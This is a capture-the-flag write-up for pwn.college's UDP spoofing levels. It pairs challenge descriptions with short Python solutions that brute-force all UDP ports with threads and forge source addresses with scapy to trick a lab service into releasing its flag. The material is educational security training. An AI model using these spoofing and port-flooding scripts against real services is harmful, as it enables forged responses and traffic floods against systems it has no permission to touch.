---
tags: ["Computer Networking", "UDP", "Sproofing"]
title: "UDP Sproofing"
description: UDP Sproofing
reference: https://pwn.college/intro-to-cybersecurity/intercepting-communication/
---

# Sproofing 1

## Description

There are two dangers to UDP: first, it is often used in places where people are already cutting corners for performence's sake. Second, it forces the programmer to keep track of sessions explicitly. This combination can cause security issues.

In this challenge, one side of the connection can confuse a non-trusted connection for a trusted connection, and print the flag. Can you trigger this confusion?

NOTE: In this level, the flag will just be printed to the console when you trigger the confusion. We'll work on realistically exfiltrating it later.

## Solution

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create UDP socket
sock.bind(("10.0.0.1", 31337))
sock.sendto(b"FLAG", ("10.0.0.2", 31338))
```

---

# Sproofing 2

## Description

There is a fairly wide gap between the features that TCP provides and UDP's barebones nature. Sometimes, developers want some of those features, and end up reimplementing just those that they need on top of UDP. This leads to weird situations, such as the ability to trigger outbound traffic to other servers, with a potential application to Denial of Service amplification.

Rather than leaking the flag directly, this challenge allows you to redirect it to another server. Can you catch it on the other side?

HINT: You'll need to either use a UDP server to actually receive the flag (e.g., python or netcat), or just sniff it off the network with Wireshark when it comes to you, even if you don't have a server listening!

## Solution

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create UDP socket
sock.bind(("10.0.0.1", 31337))
sock.sendto(b"FLAG:10.0.0.1:31337", ("10.0.0.2", 31338))

data, addr = sock.recvfrom(1024)

print(data.decode())
```

---

# Sproofing 3

## Description

Of course, the previous spoofing worked because you know the source port that the client was using, and were thus able to forge the server's response. This was, in fact, at the core of a very famous vulnerability in the Domain Name System that facilitates the translation of host names like https://pwn.college to the appropriate IP addresses. The vulnerability allowed attackers to forge responses from DNS servers and redirect victims to IP addresses of their choice!

The fix for that vulnerability was to randomize the source port that DNS requests go out from. Likewise, this challenge no longer binds the source port to 31338. Can you still force the response?

HINT: The source port is only set once per socket, whether at bind time or at the first sendto. What do you do when there's a fixed number that you don't know?

## Solution

Try all possible ports!

```python
import socket
import time
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create UDP socket
sock.settimeout(1)
sock.bind(("10.0.0.1",31337))

def send(port):
    sock.sendto(b"FLAG:10.0.0.1:31337", ("10.0.0.2", port))
    try:
        data, addr = sock.recvfrom(1024)
        print(data.decode())
    except:
        pass

for i in range(1, 65535):
    threading.Thread(target=send, args=[i], daemon=True).start()
    if i % 500 == 0:
        time.sleep(1)
```

---

# Sproofing 4

## Description

Let's up the game a bit: this challenge checks that the response came from the right server! Luckily, UDP is a lot easier to forge than TCP. In TCP, forging a server response requires you to know sequence numbers and a whole bunch of other inconvenient-to-guess information. Not so with UDP!

Go ahead and craft the server response with scapy, as you've done with TCP, and let's see that flag fly!

## Solution

```python
     1	from scapy.all import IP, UDP, Raw, send, sniff
     2	import threading
     3	import time
     4	
     5	def handle_packet(packet):
     6	    if IP in packet and UDP in packet:
     7	        if packet[IP].src == "10.0.0.2":
     8	            print(f"Received from 10.0.0.2: {packet[UDP].payload.load}")
     9	
    10	def send_packet(dport):
    11	    packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=dport) / Raw(b"FLAG:10.0.0.1:31337")
    12	    send(packet, verbose=False)
    13	
    14	threading.Thread(target=sniff, kwargs={"filter":"udp and src host 10.0.0.2", "prn":handle_packet, "store":False}, daemon=True).start()
    15	
    16	# Flood all ports from 1 to 65535
    17	for i in range(1, 65536):
    18	    threading.Thread(target=send_packet, args=(i,), daemon=True).start()
    19	    if i % 550 == 0:
    20	        time.sleep(1)
```
